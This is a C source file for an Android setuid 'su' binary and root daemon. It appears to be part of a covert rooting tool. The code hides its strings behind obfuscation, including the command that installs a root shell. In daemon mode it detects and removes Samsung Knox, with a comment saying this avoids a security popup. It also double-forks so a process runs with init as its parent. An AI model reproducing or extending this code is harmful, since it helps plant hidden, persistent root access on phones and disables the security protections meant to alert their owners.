#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <sys/time.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <stdint.h>
#include <pwd.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <sys/types.h>

#include "su.h"
#include "utils.h"
#include "suidext.h"
#include "knox_manager.h"
#include "deobfuscate.h"
#include "log.h"

extern int is_daemon;
extern int daemon_from_uid;
extern int daemon_from_pid;
pid_t server_pid;

static unsigned char ld_library_path[] = "\x92\x6f\xf2\x22\x2a\x53\x22\x25\x50\x40\x2d\x40\x55\x53\x5e\x2d\x5a\x26"; // "LD_LIBRARY_PATH"
static unsigned char system_libs[] = "\x5a\xed\xa0\x8f\xf4\xc1\xcc\xc6\xcf\xf8\x8f\xce\xcd\xc8\xa0\x8f\xfb\xfd\xfb\xf6\xc1\xc9\x8f\xce\xcd\xc8"; // "/vendor/lib:/system/lib"
static unsigned char rt[] = "\x04\x16\x10\x9a\x90";

// Fork and give to the child the init context
int fork_zero_fucks() {
  int pid = fork();

  // The parent wait for the child exit
  if (pid) {
    int status;
    waitpid(pid, &status, 0);
    return pid;
  }

  // The child fork again
  else {
    // The parent of the new child exit allowing his parent to continue
    if (pid = fork())
      exit(0);

    // At this point the new child has the init as parent
    return 0;
  }
}


int main(int argc, char *argv[]) {
  char path[256];
  char *tmp;
  char bin_name[256];
  int i = 0;
  pid_t pid = 0;
  int status = 0;

  if(argc < 2) return -1;

  #ifdef DEBUG
  LOGD("CMD: argc %d", argc);
  for(i = 1; i < argc; i++)
    LOGD("  -arg[%d]: %s", i, argv[i]);
  #endif

  if (strcmp(argv[1], "air") == 0) return 1;

  // Set argv[0] always as absolute path. We need it in the daemon to copy the file.
  if(*argv[0] != '/') { 
    tmp = strtok(argv[0], "/");
    strncpy(bin_name, tmp, sizeof(bin_name));

    while(tmp) {
      strncpy(bin_name, tmp, sizeof(bin_name));
      tmp = strtok(NULL, "/");
    }

    getcwd(path, sizeof(path));
    strcat(path, "/");
    strncat(path, bin_name, sizeof(path));

    argv[0] = path;
  }

  return su_main(argc, argv, 1);

}


int su_main(int argc, char *argv[], int need_client) {
    pid_t pid;
    int status;

    // start up in daemon mode if prompted
    if (argc == 2 && strcmp(argv[1], "--daemon") == 0) {

      // Start the daemon as init child
      //if(fork())
      //return 0;

      // Stop knox to avoid security popup if exists
      if(is_knox_present())
	remove_knox();
      
      server_pid = getpid();
      return run_daemon();
    }

    // install the shell
    if (strcmp(argv[1], deobfuscate(rt)) == 0) 
      return exec_cmd(argc, argv);


    // Sanitize all secure environment variables (from linker_environ.c in AOSP linker).
    /* The same list than GLibc at this point */
    unsigned char* unsec_vars[] = {
      "\x6e\xe6\x82\xe9\xf5\xe1\xe0\xf8\xf1\xc2\xf3\xc6\xea",                                         // "GCONV_PATH"
      "\x16\x2a\x37\x51\x57\x46\x55\xa9\xa8\x50\x59\x56\xa3\x44",                                     // "GETCONF_DIR"
      "\x17\x35\x29\xa1\xb8\x4c\x4d\xbe\xa5\xa6\xbe\x4c\xb2\x4c",                                     // "HOSTALIASES"
      "\xcc\x82\x46\x80\x88\x97\x8d\x99\x88\x85\x98",                                                 // "LD_AUDIT"
      "\x9b\xdf\x4c\x69\x61\x7c\x61\x62\x67\x72\x64",                                                 // "LD_DEBUG"
      "\x35\x15\x2f\x9b\x93\x6a\x93\x90\x99\x60\x92\x6a\x9a\x60\x63\x6f\x60\x63",                     // "LD_DEBUG_OUTPUT"
      "\x3c\x66\x55\xb0\xb8\xaf\xb8\xad\xbe\x85\xb1\xbd\x83\xaf\xb7\xb9\x85\xbb",                     // "LD_DYNAMIC_WEAK"
      "\xec\xc2\x21\xa0\xa8\xb7\xa0\xa5\xb2\x42\xad\x42\xb5\xb7\xbc\xad\xb8\xa4",                     // "LD_LIBRARY_PATH"
      "\xee\x95\x75\xa2\xaa\xd3\xa3\xc4\xa9\xab\xa9\xa0\xd3\xc6\xd1\xda\xae",                         // "LD_ORIGIN_PATH"
      "\xed\x59\xbe\xa3\x5b\x52\x4f\x41\x58\xa3\xa2\x5c\x5b",                                         // "LD_PRELOAD"
      "\xdd\x1c\xcb\xb1\xa9\x82\xb5\xb7\xb2\xab\xac\xb1\xa8",                                         // "LD_PROFILE"
      "\x87\xca\x41\x5f\x47\x68\x54\x53\x58\x50\x68\x5a\x56\x63\x51\xa2",                             // "LD_SHOW_AUXV"
      "\x60\x04\x74\x34\x2c\x47\x3d\x33\x2d\x47\x34\x37\x21\x2c\x47\x22\x29\x21\x33",                 // "LD_USE_LOAD_BIAS"
      "\x8e\x25\xa0\xc2\xc3\xd7\xd1\xc2\xca\xc3\xcd\xd1\xc9\xc0",                                     // "LOCALDOMAIN"
      "\x94\xd5\x46\x78\x65\x79\x4c\x7f\x40\x64",                                                     // "LOCPATH"
      "\xe0\xe5\x09\x77\x63\x74\x74\x71\x6d\x41\x7c\x72\x63\x6d\x6f\x3b",                             // "MALLOC_TRACE"
      "\x02\x30\x3f\x4f\x43\x4e\x4e\x4d\x41\xbd\x41\x4a\x47\x41\x49\xbd",                             // "MALLOC_CHECK_"
      "\xf9\x13\xe2\xd9\xd0\xae\xaa\xaf\xd8\xd3\xd7",                                                 // "NIS_PATH"
      "\xf5\x05\xf7\xc5\xbb\xae\xaf\xbc\xa3\xc7",                                                     // "NLSPATH"
      "\x28\xc5\xfd\xfa\xf7\x85\xe9\xec\x86\xf9\xe0\xe9\x85\x84\xf9\xf5\xe9\xee\xf6",                 // "RESOLV_HOST_CONF"
      "\xde\x47\x92\x94\xa5\x93\x8f\x9f\x92\x96\x99\x9f\x90\x93",                                     // "RES_OPTIONS"
      "\x87\x04\x85\xd3\xca\xdf\xc3\xd6\xdd",                                                         // "TMPDIR"
      "\xf1\x5e\xaa\x5d\x57\x4d\x48\x5f",                                                             // "TZDIR
      "\x9c\x1e\x97\xf0\xe8\xff\xe5\xef\xf9\xf8\xff\xf0\xed\xe2\xf2\xe5\xf2\xfd\xff\xf4\xe5\xf8\xec\xc5", // "LD_AOUT_LIBRARY_PATH"
      "\x20\x14\x3b\x94\x6c\x87\x61\x97\x9d\x9c\x87\x90\x92\x6d\x94\x97\x61\x6c",                     // "LD_AOUT_PRELOAD"
      // not listed in linker, used due to system() call
      "\xe4\xca\x2d\xbd\xa6\x4b",                                                                     // "IFS",
    };

    int i = 0;
    for(i=0; i<sizeof(unsec_vars)/sizeof(unsec_vars[0]); i++)
      unsetenv(deobfuscate(unsec_vars[i]));

    /*
     * set LD_LIBRARY_PATH if the linker has wiped out it due to we're suid.
     * This occurs on Android 4.0+
     */
    setenv(deobfuscate(ld_library_path), deobfuscate(system_libs), 0);

    if (need_client) 
      return connect_daemon(argc, argv);
}
